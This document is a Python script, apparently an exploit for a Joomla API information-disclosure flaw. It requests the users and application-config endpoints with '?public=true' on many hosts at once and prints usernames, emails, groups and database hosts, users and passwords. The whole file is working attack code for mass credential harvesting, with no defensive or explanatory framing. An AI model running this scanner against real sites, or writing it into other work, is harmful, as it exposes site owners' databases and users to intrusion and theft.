import argparse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

class URLScanner:
    def __init__(self, url_list, output_file=None, endpoint="/api/index.php/v1/config/application?public=true", timeout=2, max_threads=10):
        self.url_list = url_list
        self.output_file = output_file
        self.endpoint = endpoint
        self.timeout = timeout
        self.max_threads = max_threads

    def fetch_data(self, url, endpoint):
        try:
            # Fetch data from the specified endpoint
            response = requests.get(f"http://{url}{endpoint}", timeout=self.timeout)
            response.raise_for_status()  # Raise an error for HTTP errors
            return response.text
        except requests.exceptions.RequestException as e:
            print(f"[-] => Error occurred for {url}: {e}")
            return None

    def fetch_users(self, url):
        # Fetch user data using the specified endpoint
        return self.fetch_data(url, "/api/index.php/v1/users?public=true")

    def fetch_config(self, url):
        # Fetch configuration data using the specified endpoint
        return self.fetch_data(url, self.endpoint)

    def parse_users(self, data_json):
        # Parse user data from JSON
        data = json.loads(data_json)['data']
        users = []
        for user in data:
            if user['type'] == 'users':
                user_info = user['attributes']
                users.append(user_info)
        return users

    def parse_config(self, data_json):
        # Parse configuration data from JSON
        data = json.loads(data_json)['data']
        config = {}
        for entry in data:
            if entry['type'] == 'application':
                key = list(entry['attributes'].keys())[0]
                config[key] = entry['attributes'][key]
        return config

    def display_users(self, url):
        # Display user information
        data_json = self.fetch_users(url)
        if data_json:
            users = self.parse_users(data_json)
            print("\nUsers:")
            for user in users:
                print(f"[{user['id']}] {user['name']} ({user['username']}) - {user['email']} - {user['group_names']}")

    def display_config(self, url):
        # Display site configuration
        data_json = self.fetch_config(url)
        if data_json:
            config = self.parse_config(data_json)
            print("\nSite info:")
            print(f"Site name: {config['sitename']}")
            print(f"Editor: {config['editor']}")
            print(f"Captcha: {config['captcha']}")
            print(f"Access: {config['access']}")
            print(f"Debug status: {config['debug']}")
            print("\nDatabase info:")
            print(f"DB type: {config['dbtype']}")
            print(f"DB host: {config['host']}")
            print(f"DB user: {config['user']}")
            print(f"DB password: {config['password']}")
            print(f"DB name: {config['db']}")
            print(f"DB prefix: {config['dbprefix']}")
            print(f"DB encryption: {config['dbencryption']}")

    def scan_url(self, url):
        # Scan a single URL and display information
        print(f"Retrieving information from the URL: {url}")
        self.display_users(url)
        self.display_config(url)

    def scan(self):
        # Scan multiple URLs concurrently
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.scan_url, url) for url in self.url_list]
            for future in as_completed(futures):
                future.result()

if __name__ == "__main__":
    # Command-line argument parsing
    parser = argparse.ArgumentParser()
    url_group = parser.add_mutually_exclusive_group(required=True)
    url_group.add_argument("-u", "--url", type=str, help="URL to scan")
    url_group.add_argument("-f", "--file", type=str, help="Path to the file containing URLs to scan")
    parser.add_argument("-o", "--output_file", type=str, help="Path to the output file (optional)")
    parser.add_argument("-e", "--endpoint", type=str, default="/api/index.php/v1/config/application?public=true",
                        help="Endpoint to scan (default: /api/index.php/v1/config/application?public=true)")
    parser.add_argument("-t", "--timeout", type=int, default=2, help="Timeout in seconds (default: 2)")
    parser.add_argument("-m", "--max_threads", type=int, default=10, help="Maximum number of threads (default: 10)")
    args = parser.parse_args()

    # Extract URLs from command-line arguments
    url_list = [args.url] if args.url else [line.strip() for line in open(args.file)]

    # Initialize and run the scanner
    scanner = URLScanner(url_list, args.output_file, endpoint=args.endpoint, timeout=args.timeout, max_threads=args.max_threads)
    scanner.scan()
